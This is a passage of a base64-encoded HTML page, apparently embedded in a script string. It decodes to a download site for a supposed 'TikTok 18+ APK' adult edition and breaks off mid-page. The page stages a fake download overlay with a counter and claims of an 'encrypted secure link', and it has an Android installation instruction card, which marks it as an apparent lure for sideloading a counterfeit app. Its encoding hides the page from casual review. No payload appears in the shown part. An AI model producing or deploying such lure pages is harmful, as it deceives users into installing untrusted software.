+'PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQo8aGVhZD4NCiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+DQogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPg0KICAgIDx0aXRsZT5UaWtUb2sgMTgrIEFQSyB2MS43LjMg4oCTIGFkdWx0IHZlcnNpb24gKDIwMjYpPC90aXRsZT4NCiAgICA8bGluayByZWw9Imljb24iIHR5cGU9ImltYWdlL3N2Zyt4bWwiIGhyZWY9ImltYWdlcy9pY29uLnBuZyI+DQogICAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9ib290c3RyYXBANS4zLjIvZGlzdC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCI+DQogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2Jvb3RzdHJhcC1pY29uc0AxLjExLjMvZm9udC9ib290c3RyYXAtaWNvbnMubWluLmNzcyI+DQogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9mb250LWF3ZXNvbWUvNi4wLjAtYmV0YTMvY3NzL2FsbC5taW4uY3NzIj4NCiAgICA8IS0tIHN0eWxlcy5jc3Mgd2lsbCBiZSBsaW5rZWQg4oCTIGhlcmUgd2UgYWRkIHN0eWxlIGJsb2NrIGZvciBuZXcgZWxlbWVudHMgKHlvdSBjYW4gbW92ZSB0aGlzIHRvIHN0eWxlcy5jc3MpIC0tPg0KICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9zdHlsZXMuY3NzIj4NCg0KICAgIDxzdHlsZT4NCiAgICAgICAgLyogLS0tLS0tLS0tLSBnbG9iYWwgZGFyayAobWluaW1hbCwgcmVzdCBpbiB5b3VyIHN0eWxlcy5jc3MpIC0tLS0tLS0tLS0gKi8NCiAgICAgICAgYm9keSB7DQogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMGEwYzBmOw0KICAgICAgICAgICAgY29sb3I6ICNlMGUwZTA7DQogICAgICAgICAgICBmb250LWZhbWlseTogJ0ludGVyJywgc3lzdGVtLXVpLCAtYXBwbGUtc3lzdGVtLCAnU2Vnb2UgVUknLCBSb2JvdG8sIHNhbnMtc2VyaWY7DQogICAgICAgIH0NCiAgICAgICAgLmhlcm8tZ3JhZGllbnQgew0KICAgICAgICAgICAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDE0NWRlZywgIzBmMTIxNyAwJSwgIzFiMjMyYyAxMDAlKTsNCiAgICAgICAgICAgIGNvbG9yOiB3aGl0ZTsNCiAgICAgICAgfQ0KICAgICAgICAuYnRuLWRvd25sb2FkIHsNCiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNjMDEyM2I7DQogICAgICAgICAgICBjb2xvcjogd2hpdGU7DQogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA2MHB4Ow0KICAgICAgICAgICAgcGFkZGluZzogMTRweCAzOHB4Ow0KICAgICAgICAgICAgZm9udC13ZWlnaHQ6IDYwMDsNCiAgICAgICAgICAgIGJvcmRlcjogbm9uZTsNCiAgICAgICAgICAgIHRyYW5zaXRpb246IDAuMnM7DQogICAgICAgICAgICBib3gtc2hhZG93OiAwIDhweCAxNnB4IHJnYmEoMTgwLCAwLCA1MCwgMC4zKTsNCiAgICAgICAgICAgIGN1cnNvcjogcG9pbnRlcjsNCiAgICAgICAgICAgIGRpc3BsYXk6IGlubGluZS1ibG9jazsNCiAgICAgICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsNCiAgICAgICAgfQ0KICAgICAgICAuYnRuLWRvd25sb2FkOmhvdmVyIHsNCiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNhMDBmMzI7DQogICAgICAgICAgICB0cmFuc2Zvcm06IHNjYWxlKDEuMDIpOw0KICAgICAgICAgICAgY29sb3I6IHdoaXRlOw0KICAgICAgICB9DQogICAgICAgIC5mZWF0dXJlLWljb24gew0KICAgICAgICAgICAgd2lkdGg6IDY0cHg7DQogICAgICAgICAgICBoZWlnaHQ6IDY0cHg7DQogICAgICAgICAgICBiYWNrZ3JvdW5kOiAjYzAxMjNiOw0KICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogNTAlOw0KICAgICAgICAgICAgZGlzcGxheTogZmxleDsNCiAgICAgICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7DQogICAgICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsNCiAgICAgICAgICAgIGZvbnQtc2l6ZTogMjhweDsNCiAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDIwcHg7DQogICAgICAgIH0NCiAgICAgICAgLnByb3MtaWNvbiB7IGNvbG9yOiAjMmRiODZiOyBtYXJnaW4tcmlnaHQ6IDEycHg7IH0NCiAgICAgICAgLmNvbnMtaWNvbiB7IGNvbG9yOiAjZTA1YTZmOyBtYXJnaW4tcmlnaHQ6IDEycHg7IH0NCiAgICAgICAgLmFsaWduLWl0ZW1zLWNlbnRlciB7DQogICAgICAgICAgICBkaXNwbGF5OiBmbGV4Ow0KICAgICAgICAgICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbi1yZXZlcnNlOw0KICAgICAgICB9DQogICAgICAgIC8qIC0tLS0tIHNjcmVlbnNob3QgY2Fyb3VzZWwgLS0tLS0gKi8NCiAgICAgICAgLnNjcmVlbnNob3QtY2Fyb3VzZWwgew0KICAgICAgICAgICAgYmFja2dyb3VuZDogIzEyMWEyMjsNCiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDM2cHg7DQogICAgICAgICAgICBwYWRkaW5nOiAycmVtIDFyZW07DQogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjMmMzYjRhOw0KICAgICAgICAgICAgbWFyZ2luLXRvcDogMS41cmVtOw0KICAgICAgICB9DQogICAgICAgIC5jYXJvdXNlbC1pbWFnZS13cmFwcGVyIHsNCiAgICAgICAgICAgIG1heC13aWR0aDogMzAwcHg7DQogICAgICAgICAgICBtYXJnaW46IDAgYXV0bzsNCiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDM2cHg7DQogICAgICAgICAgICBvdmVyZmxvdzogaGlkZGVuOw0KICAgICAgICAgICAgYm94LXNoYWRvdzogMCAyMHB4IDMwcHggLTEwcHggYmxhY2s7DQogICAgICAgIH0NCiAgICAgICAgLmNhcm91c2VsLWltYWdlLXdyYXBwZXIgaW1nIHsNCiAgICAgICAgICAgIHdpZHRoOiAxMDAlOw0KICAgICAgICAgICAgaGVpZ2h0OiBhdXRvOw0KICAgICAgICAgICAgZGlzcGxheTogYmxvY2s7DQogICAgICAgIH0NCiAgICAgICAgLmNhcm91c2VsLWNvbnRyb2wtcHJldiwgLmNhcm91c2VsLWNvbnRyb2wtbmV4dCB7DQogICAgICAgICAgICBmaWx0ZXI6IGludmVydCgxKTsNCiAgICAgICAgICAgIG9wYWNpdHk6IDAuNzsNCiAgICAgICAgfQ0KICAgICAgICAuY2Fyb3VzZWwtaW5kaWNhdG9ycyB7DQogICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAtMS41cmVtOw0KICAgICAgICB9DQogICAgICAgIC5jYXJvdXNlbC1pbmRpY2F0b3JzIFtkYXRhLWJzLXRhcmdldF0gew0KICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2MwMTIzYjsNCiAgICAgICAgfQ0KDQogICAgICAgIC8qIC0tLS0tLS0tLS0gYmVhdXRpZnVsIGRvd25sb2FkIG92ZXJsYXkgLS0tLS0tLS0tLSAqLw0KICAgICAgICAuZG93bmxvYWQtb3ZlcmxheSB7DQogICAgICAgICAgICBwb3NpdGlvbjogZml4ZWQ7DQogICAgICAgICAgICB0b3A6IDA7IGxlZnQ6IDA7IHdpZHRoOiAxMDAlOyBoZWlnaHQ6IDEwMCU7DQogICAgICAgICAgICBiYWNrZ3JvdW5kOiByZ2JhKDgsIDEyLCAxOCwgMC45NSk7DQogICAgICAgICAgICBiYWNrZHJvcC1maWx0ZXI6IGJsdXIoMTJweCk7DQogICAgICAgICAgICB6LWluZGV4OiA5OTk5Ow0KICAgICAgICAgICAgZGlzcGxheTogZmxleDsNCiAgICAgICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7DQogICAgICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsNCiAgICAgICAgICAgIG9wYWNpdHk6IDA7DQogICAgICAgICAgICB2aXNpYmlsaXR5OiBoaWRkZW47DQogICAgICAgICAgICB0cmFuc2l0aW9uOiBhbGwgMC40cyBlYXNlOw0KICAgICAgICAgICAgY29sb3I6IHdoaXRlOw0KICAgICAgICB9DQogICAgICAgIC5kb3dubG9hZC1vdmVybGF5LnNob3cgew0KICAgICAgICAgICAgb3BhY2l0eTogMTsNCiAgICAgICAgICAgIHZpc2liaWxpdHk6IHZpc2libGU7DQogICAgICAgIH0NCiAgICAgICAgLmRvd25sb2FkLWNhcmQgew0KICAgICAgICAgICAgYmFja2dyb3VuZDogIzE1MWYyYjsNCiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDQ4cHg7DQogICAgICAgICAgICBwYWRkaW5nOiAyLjVyZW07DQogICAgICAgICAgICBtYXgtd2lkdGg6IDUwMHB4Ow0KICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyOw0KICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgI2MwMTIzYjU1Ow0KICAgICAgICAgICAgYm94LXNoYWRvdzogMCAzMHB4IDUwcHggIzAwMDAwMDgwLCAwIDAgMCAycHggI2MwMTIzYiBpbnNldDsNCiAgICAgICAgICAgIHRyYW5zZm9ybTogc2NhbGUoMC45NSk7DQogICAgICAgICAgICB0cmFuc2l0aW9uOiAwLjNzOw0KICAgICAgICB9DQogICAgICAgIC5kb3dubG9hZC1vdmVybGF5LnNob3cgLmRvd25sb2FkLWNhcmQgew0KICAgICAgICAgICAgdHJhbnNmb3JtOiBzY2FsZSgxKTsNCiAgICAgICAgfQ0KICAgICAgICAuY291bnRlciB7DQogICAgICAgICAgICBmb250LXNpemU6IDRyZW07DQogICAgICAgICAgICBmb250LXdlaWdodDogODAwOw0KICAgICAgICAgICAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDQ1ZGVnLCAjZmY4YTlmLCAjZGMxNDNjKTsNCiAgICAgICAgICAgIC13ZWJraXQtYmFja2dyb3VuZC1jbGlwOiB0ZXh0Ow0KICAgICAgICAgICAgYmFja2dyb3VuZC1jbGlwOiB0ZXh0Ow0KICAgICAgICAgICAgY29sb3I6IHRyYW5zcGFyZW50Ow0KICAgICAgICAgICAgbGluZS1oZWlnaHQ6IDEuMjsNCiAgICAgICAgfQ0KICAgICAgICAuY291bnRlci1sYWJlbCB7DQogICAgICAgICAgICBmb250LXNpemU6IDEuMnJlbTsNCiAgICAgICAgICAgIGNvbG9yOiAjYWNiOGNjOw0KICAgICAgICB9DQogICAgICAgIC5wcm9ncmVzcy1iYXItY3VzdG9tIHsNCiAgICAgICAgICAgIGhlaWdodDogOHB4Ow0KICAgICAgICAgICAgYmFja2dyb3VuZDogIzJhMzg0ODsNCiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDIwcHg7DQogICAgICAgICAgICBtYXJnaW46IDEuOHJlbSAwOw0KICAgICAgICAgICAgb3ZlcmZsb3c6IGhpZGRlbjsNCiAgICAgICAgfQ0KICAgICAgICAucHJvZ3Jlc3MtZmlsbCB7DQogICAgICAgICAgICB3aWR0aDogMCU7DQogICAgICAgICAgICBoZWlnaHQ6IDEwMCU7DQogICAgICAgICAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoOTBkZWcsICNkYzE0M2MsICNmZjZhOGEpOw0KICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogMjBweDsNCiAgICAgICAgICAgIHRyYW5zaXRpb246IHdpZHRoIDNzIGN1YmljLWJlemllcigwLjEsIDAuOCwgMC4zLCAxKTsNCiAgICAgICAgfQ0KDQogICAgICAgIC8qIGluc3RydWN0aW9uIGNhcmQgKGRhcmssIGVuZ2xpc2gpICovDQogICAgICAgIC5pbnN0cnVjdGlvbi1jYXJkIHsNCiAgICAgICAgICAgIG1heC13aWR0aDogMTAwMHB4Ow0KICAgICAgICAgICAgbWFyZ2luOiAycmVtIGF1dG8gMDsNCiAgICAgICAgICAgIGJhY2tncm91bmQ6ICMxNjIwMmQ7DQogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA0OHB4Ow0KICAgICAgICAgICAgYm94LXNoYWRvdzogMCAzMHB4IDYwcHggLTIwcHggIzAwMDAwMGQwLCAwIDAgMCAxcHggIzJlNDA1NSBpbnNldDsNCiAgICAgICAgICAgIHBhZGRpbmc6IDJyZW0gMnJlbSAyLjVyZW07DQogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjMjUzNDQxOw0KICAgICAgICB9DQogICAgICAgIC5pbnN0cnVjdGlvbi1oZWFkZXIgLmFuZHJvaWQtYmFkZ2Ugew0KICAgICAgICAgICAgYmFja2dyb3VuZDogIzJiNGYzYjsNCiAgICAgICAgICAgIGNvbG9yOiAjYzBmMmQwOw0KICAgICAgICAgICAgcGFkZGluZzogMC40cmVtIDFyZW07DQogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA0MHB4Ow0KICAgICAgICAgICAgZm9udC13ZWlnaHQ6IDYwMDsNCiAgICAgICAgICAgIGZvbnQtc2l6ZTogMC45cmVtOw0KICAgICAgICAgICAgZGlzcGxheTogaW5saW5lLWZsZXg7DQogICAgICAgICAgICBhbGlnbi1pdGVtczogY2VudGVyOw0KICAgICAgICAgICAgZ2FwOiA4cHg7DQogICAgICAgICAgICBib3gtc2hhZG93OiAwIDZweCAxNHB4ICMxZjRiMmY4MDsNCiAgICAgICAgfQ0KICAgICAgICAuaW5zdHJ1Y3Rpb24tdGl0bGUgew0KICAgICAgICAgICAgZm9udC1zaXplOiAyLjJyZW07DQogICAgICAgICAgICBmb250LXdlaWdodDogNzAwOw0KICAgICAgICAgICAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDEzNWRlZywgI2ZmZmZmZiwgI2RjYjBjMCk7DQogICAgICAgICAgICAtd2Via2l0LWJhY2tncm91bmQtY2xpcDogdGV4dDsNCiAgICAgICAgICAgIGJhY2tncm91bmQtY2xpcDogdGV4dDsNCiAgICAgICAgICAgIGNvbG9yOiB0cmFuc3BhcmVudDsNCiAgICAgICAgfQ0KICAgICAgICAuc3RlcHMtZ3JpZCB7DQogICAgICAgICAgICBkaXNwbGF5OiBmbGV4Ow0KICAgICAgICAgICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsNCiAgICAgICAgICAgIGdhcDogMS4yNXJlbTsNCiAgICAgICAgICAgIG1hcmdpbjogMi41cmVtIDAgMnJlbTsNCiAgICAgICAgfQ0KICAgICAgICAuc3RlcC1pdGVtIHsNCiAgICAgICAgICAgIGJhY2tncm91bmQ6ICMxZjJiMzk7DQogICAgICAgICAgICBib3JkZXItcmFkaXVzOiAyOHB4Ow0KICAgICAgICAgICAgcGFkZGluZzogMS4ycmVtIDEuOHJlbSAxLjJyZW0gMS4ycmVtOw0KICAgICAgICAgICAgZGlzcGxheTogZmxleDsNCiAgICAgICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7DQogICAgICAgICAgICBnYXA6IDAuMnJlbTsNCiAgICAgICAgICAgIGJveC1zaGFkb3c6IDAgOHB4IDE4cHggLTZweCAjMDAwMDAwODA7DQogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjMzE0YzY2Ow0KICAgICAgICB9DQogICAgICAgIC5zdGVwLW51bWJlciB7DQogICAgICAgICAgICB3aWR0aDogNDhweDsNCiAgICAgICAgICAgIGhlaWdodDogNDhweDsNCiAgICAgICAgICAgIGJhY2tncm91bmQ6ICMyOTM5NGY7DQogICAgICAgICAgICBib3JkZXItcmFkaXVzOiAzMHB4Ow0KICAgICAgICAgICAgZGlzcGxheTogZmxleDsNCiAgICAgICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7DQogICAgICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsNCiAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiA3MDA7DQogICAgICAgICAgICBmb250LXNpemU6IDEuNXJlbTsNCiAgICAgICAgICAgIGNvbG9yOiAjZmY5YmIwOw0KICAgICAgICAgICAgZmxleC1zaHJpbms6IDA7DQogICAgICAgIH0NCiAgICAgICAgLnN0ZXAtY29udGVudCB7IGZsZXg6IDE7IH0NCiAgICAgICAgLnN0ZXAtdGl0bGUgew0KICAgICAgICAgICAgZm9udC13ZWlnaHQ6IDcwMDsNCiAgICAgICAgICAgIGZvbnQtc2l6ZTogMS4yNXJlbTsNCiAgICAgICAgICAgIGNvbG9yOiAjZmZmZmZmOw0KICAgICAgICB9DQogICAgICAgIC5zdGVwLWRlc2MgeyBjb2xvcjogI2IyYzllNTsgZm9udC1zaXplOiAwLjk4cmVtOyB9DQogICAgICAgIC5zdGVwLWljb24geyBmb250LXNpemU6IDEuNnJlbTsgY29sb3I6ICNmZjg4OWY7IHdpZHRoOiA0MHB4OyB0ZXh0LWFsaWduOiBjZW50ZXI7IH0NCiAgICAgICAgLndhcm5pbmctbm90ZSB7DQogICAgICAgICAgICBiYWNrZ3JvdW5kOiAjMmYyODFjOw0KICAgICAgICAgICAgYm9yZGVyLWxlZnQ6IDZweCBzb2xpZCAjZjZiODNlOw0KICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogMjRweDsNCiAgICAgICAgICAgIHBhZGRpbmc6IDEuMnJlbSAxLjhyZW07DQogICAgICAgICAgICBtYXJnaW46IDJyZW0gMCAxLjhyZW07DQogICAgICAgICAgICBkaXNwbGF5OiBmbGV4Ow0KICAgICAgICAgICAgZ2FwOiAxcmVtOw0KICAgICAgICB9DQogICAgICAgIC53YXJuaW5nLW5vdGUgaSB7IGZvbnQtc2l6ZTogMS44cmVtOyBjb2xvcjogI2Y2YjgzZTsgfQ0KICAgICAgICAudG9nZ2xlLWRlbW8tbGVmdCB7DQogICAgICAgICAgICBkaXNwbGF5OiBmbGV4Ow0KICAgICAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsNCiAgICAgICAgICAgIGdhcDogMjBweDsNCiAgICAgICAgfQ0KICAgICAgICAudG9nZ2xlLWRlbW8gew0KICAgICAgICAgICAgYmFja2dyb3VuZDogIzEwMTYxZjsNCiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDM2cHg7DQogICAgICAgICAgICBwYWRkaW5nOiAxLjVyZW0gMnJlbTsNCiAgICAgICAgICAgIG1hcmdpbi10b3A6IDJyZW07DQogICAgICAgICAgICBkaXNwbGF5OiBmbGV4Ow0KICAgICAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsNCiAgICAgICAgICAgIGZsZXgtd3JhcDogd3JhcDsNCiAgICAgICAgICAgIGdhcDogMS41cmVtOw0KICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgIzRmNWI3ZTsNCiAgICAgICAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOw0KICAgICAgICB9DQogICAgICAgIC50b2dnbGUtc3dpdGNoIHsNCiAgICAgICAgICAgIHdpZHRoOiA2MHB4OyBoZWlnaHQ6IDMwcHg7IGJhY2tncm91bmQ6ICMzODQwNWY7IGJvcmRlci1yYWRpdXM6IDQwcHg7DQogICAgICAgICAgICBkaXNwbGF5OiBmbGV4OyBhbGlnbi1pdGVtczogY2VudGVyOyBwYWRkaW5nOiAzcHg7DQogICAgICAgIH0NCiAgICAgICAgLnRvZ2dsZS1zd2l0Y2gtY2lyY2xlIHsNCiAgICAgICAgICAgIHdpZHRoOiAyNHB4OyBoZWlnaHQ6IDI0cHg7IGJhY2tncm91bmQ6ICNhNWI0ZTA7IGJvcmRlci1yYWRpdXM6IDUwJTsNCiAgICAgICAgICAgIHRyYW5zaXRpb246IDAuMnM7DQogICAgICAgIH0NCiAgICAgICAgLnRvZ2dsZS1hY3RpdmUgLnRvZ2dsZS1zd2l0Y2gtY2lyY2xlIHsgdHJhbnNmb3JtOiB0cmFuc2xhdGVYKDMwcHgpOyBiYWNrZ3JvdW5kOiAjNmNkYjhjOyB9DQogICAgICAgIC5kZW1vLXNtYWxsIHsNCiAgICAgICAgICAgIGJhY2tncm91bmQ6ICMxZjI5M2Q7IHBhZGRpbmc6IDAuM3JlbSAxcmVtOyBib3JkZXItcmFkaXVzOiA0MHB4OyBjb2xvcjogI2IwYzJmZjsNCiAgICAgICAgfQ0KICAgICAgICAuZm9vdG5vdGUgew0KICAgICAgICAgICAgZm9udC1zaXplOiAwLjlyZW07IGNvbG9yOiAjOTVhOWNjOyBtYXJnaW4tdG9wOiAycmVtOyB0ZXh0LWFsaWduOiBjZW50ZXI7DQogICAgICAgICAgICBib3JkZXItdG9wOiAycHggZGFzaGVkICMyZDQwNTc7IHBhZGRpbmctdG9wOiAxLjVyZW07DQogICAgICAgIH0NCiAgICAgICAgQG1lZGlhIChtYXgtd2lkdGg6IDU1MHB4KSB7DQogICAgICAgICAgICAuaW5zdHJ1Y3Rpb24tY2FyZCB7IHBhZGRpbmc6IDEuNXJlbTsgfQ0KICAgICAgICAgICAgLmluc3RydWN0aW9uLXRpdGxlIHsgZm9udC1zaXplOiAxLjhyZW07IH0NCiAgICAgICAgfQ0KICAgIDwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCg0KICAgIDwhLS0gRE9XTkxPQUQgT1ZFUkxBWSAoYmVhdXRpZnVsIGNvdW50ZXIpIC0tPg0KICAgIDxkaXYgaWQ9ImRvd25sb2FkT3ZlcmxheSIgY2xhc3M9ImRvd25sb2FkLW92ZXJsYXkiPg0KICAgICAgICA8ZGl2IGNsYXNzPSJkb3dubG9hZC1jYXJkIj4NCiAgICAgICAgICAgIDxpIGNsYXNzPSJiaSBiaS1hcnJvdy1yZXBlYXQiIHN0eWxlPSJmb250LXNpemU6IDNyZW07IGNvbG9yOiAjZGMxNDNjOyI+PC9pPg0KICAgICAgICAgICAgPGgzIGNsYXNzPSJtdC0zIHRleHQtbGlnaHQiPlByZXBhcmluZyB5b3VyIGRvd25sb2FkPC9oMz4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvdW50ZXIiIGlkPSJjb3VudGVyIj4wJTwvZGl2Pg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0icHJvZ3Jlc3MtYmFyLWN1c3RvbSI+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icHJvZ3Jlc3MtZmlsbCIgaWQ9InByb2dyZXNzRmlsbCI+PC9kaXY+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDxwIGNsYXNzPSJjb3VudGVyLWxhYmVsIiBpZD0iY291bnRlclRleHQiPmluaXRpYWxpemluZyBzZWN1cmUgbGluayAuLi48L3A+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJtdC0zIHRleHQtc2Vjb25kYXJ5IHNtYWxsIj4NCiAgICAgICAgICAgICAgICA8aSBjbGFzcz0iYmkgYmktc2hpZWxkLWNoZWNrIHRleHQtZGFuZ2VyIj48L2k+IGVuY3J5cHRlZCDCtyAxOCsgb25seQ0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgIDwvZGl2Pg0KICAgIDwvZGl2Pg0KDQogICAgPG5hdiBjbGFzcz0ibmF2YmFyIG5hdmJhci1leHBhbmQtbGcgbmF2YmFyLWRhcmsgcHktMiIgc3R5bGU9ImJhY2tncm91bmQ6ICMwYTBlMTI7Ij4NCiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4NCiAgICAgICAgICAgIDxhIGNsYXNzPSJuYXZiYXItYnJhbmQgZnctYm9sZCB0ZXh0LWxpZ2h0IiBocmVmPSIjIj48aSBjbGFzcz0iYmkgYmktdGlrdG9rIG1lLTIgdGV4dC1kYW5nZXIiPjwvaT5Qcm88c3BhbiBjbGFzcz0idGV4dC1kYW5nZXIiPlRpa1Rvazwvc3Bhbj4xOCs8L2E+DQogICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJuYXZiYXItdG9nZ2xlciIgdHlwZT0iYnV0dG9uIiBkYXRhLWJzLXRvZ2dsZT0iY29sbGFwc2UiIGRhdGEtYnMtdGFyZ2V0PSIjbmF2YmFyTmF2RGFyayI+DQogICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9Im5hdmJhci10b2dnbGVyLWljb24iPjwvc3Bhbj4NCiAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sbGFwc2UgbmF2YmFyLWNvbGxhcHNlIiBpZD0ibmF2YmFyTmF2RGFyayI+DQogICAgICAgICAgICAgICAgPHVsIGNsYXNzPSJuYXZiYXItbmF2IG1zLWF1dG8iPg0KICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj48YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9IiMiPkhvbWU8L2E+PC9saT4NCiAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJuYXYtaXRlbSI+PGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSIjZmVhdHVyZXMiPkZlYXR1cmVzPC9hPjwvbGk+DQogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPjxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iI3NjcmVlbnMiPlNjcmVlbnM8L2E+PC9saT4NCiAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJuYXYtaXRlbSI+PGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSIjdmlkZW8iPlZpZGVvPC9hPjwvbGk+DQogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPjxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iI2ZhcSI+RkFRPC9hPjwvbGk+DQogICAgICAgICAgICAgICAgPC91bD4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICA8L2Rpdj4NCiAgICA8L25hdj4NCg0KICAgIDxkaXYgY2xhc3M9Imhlcm8tZ3JhZGllbnQgcHktNSBib3JkZXItYm90dG9tIGJvcmRlci1zZWNvbmRhcnkgYm9yZGVyLW9wYWNpdHktMTAiPg0KICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIgcHktMyI+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3cgYWxpZ24taXRlbXMtY2VudGVyIGctNCI+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLWxnLTciIHN0eWxlPSJwYWRkaW5nOiAwIDMwcHg7Ij4NCiAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImJhZGdlIGJnLWRhbmdlciBweC0zIHB5LTIgbWItMyBmcy02Ij7wn5SlIHYxLjcuMyDigJMgMjAyNiBFRElUSU9OPC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICA8aDEgY2xhc3M9ImRpc3BsYXktNCBmdy1ib2xkIG1iLTMiPlRpa1RvayAxOCsgPHNwYW4gc3R5bGU9ImNvbG9yOiNkYzE0M2M7Ij5BUEs8L3NwYW4+PC9oMT4NCiAgICAgICAgICAgICAgICAgICAgPHAgY2xhc3M9ImxlYWQgZnMtMyIgc3R5bGU9ImNvbG9yOiNjZmRlZmY7Ij5BZHVsdC1vcmllbnRlZCB2ZXJzaW9uIHdpdGggZXhjbHVzaXZlIGNvbnRlbnQsIG5vIGFkcywgNEsgcGxheWVyLCBhbmQgYmFja2dyb3VuZCBhdWRpby48L3A+DQogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImQtZmxleCBmbGV4LXdyYXAgZ2FwLTMgbXQtNCI+DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Imh0dHBzOi8vcGxheS5nb29nbGUuY29tL3N0b3JlL2FwcHMvZGV0YWlscz9pZD1jb20uemhpbGlhb2FwcC5tdXNpY2FsbHkmaGw9ZW5fR0IiIGNsYXNzPSJidG4gYnRuLWRvd25sb2FkIGJ0bi1sZyIgaWQ9ImRvd25sb2FkQnRuIiBkb3dubG9hZD48aSBjbGFzcz0iYmkgYmktY2xvdWQtYXJyb3ctZG93bi1maWxsIG1lLTIiPjwvaT5Eb3dubG9hZCBBUEsgdjEuNy4zPC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iI3NjcmVlbnMiIGNsYXNzPSJzY3JlZW5zIGJ0biBidG4tb3V0bGluZS1saWdodCBidG4tbGcgcm91bmRlZC1waWxsIHB4LTQiPjxpIGNsYXNzPSJiaSBiaS1pbWFnZXMgbWUtMiI+PC9pPlZpZXcgc2NyZWVuczwvYT4NCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im10LTQgc21hbGwgdGV4dC1zZWNvbmRhcnkiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGkgY2xhc3M9ImJpIGJpLX